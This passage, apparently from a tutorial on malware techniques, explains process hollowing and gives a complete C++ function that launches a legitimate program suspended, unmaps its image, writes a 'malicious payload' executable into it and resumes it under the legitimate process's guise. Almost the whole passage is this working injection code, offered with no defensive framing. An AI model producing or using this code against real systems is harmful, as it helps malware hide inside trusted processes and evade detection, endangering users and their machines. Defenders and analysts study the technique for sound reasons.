### 3. Process Hollowing
Process Hollowing is a technique where a legitimate process (suspended) is created, its memory is "hollowed out" (unmapped), and replaced with malicious code. This allows the malicious code to run under the guise of a legitimate process.

**APIs Used:** `CreateProcess` (suspended), `GetThreadContext`, `ReadProcessMemory`, `ZwUnmapViewOfSection` (NTDLL), `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread`.

*Note: This requires a valid PE (Portable Executable) payload, not just raw shellcode.*

```cpp
#include <winternl.h> // For PEB definitions
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

bool HollowProcess(const char* targetPath, const char* maliciousPayloadPath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create the target process in a suspended state
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    // 1. Get the Context of the primary thread (EBX contains PEB address)
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // 2. Read the ImageBaseAddress from the PEB
    DWORD_PTR pBaseAddress;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 8), &pBaseAddress, sizeof(DWORD_PTR), NULL);

    // 3. Unmap the original executable from the target process
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, (PVOID)pBaseAddress);
    }

    // 4. Load the malicious payload (PE) locally to parse headers
    HANDLE hFile = CreateFileA(maliciousPayloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID pLocalPayload = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ReadFile(hFile, pLocalPayload, fileSize, &fileSize, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)pLocalPayload;
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((DWORD_PTR)pLocalPayload + pDOS->e_lfanew);

    // 5. Allocate memory in the target process at the preferred ImageBase
    LPVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)pNT->OptionalHeader.ImageBase, pNT->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 6. Write Headers
    WriteProcessMemory(pi.hProcess, pRemoteImage, pLocalPayload, pNT->OptionalHeader.SizeOfHeaders, NULL);

    // 7. Write Sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT);
    for (int i = 0; i < pNT->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)pRemoteImage + pSection->VirtualAddress), 
                           (LPVOID)((DWORD_PTR)pLocalPayload + pSection->PointerToRawData), pSection->SizeOfRawData, NULL);
        pSection++;
    }

    // 8. Update the Context (Entry Point)
    ctx.Eax = (DWORD_PTR)pRemoteImage + pNT->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &pNT->OptionalHeader.ImageBase, sizeof(DWORD_PTR), NULL);
    SetThreadContext(pi.hThread, &ctx);

    // 9. Resume execution
    ResumeThread(pi.hThread);

    VirtualFree(pLocalPayload, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}
```

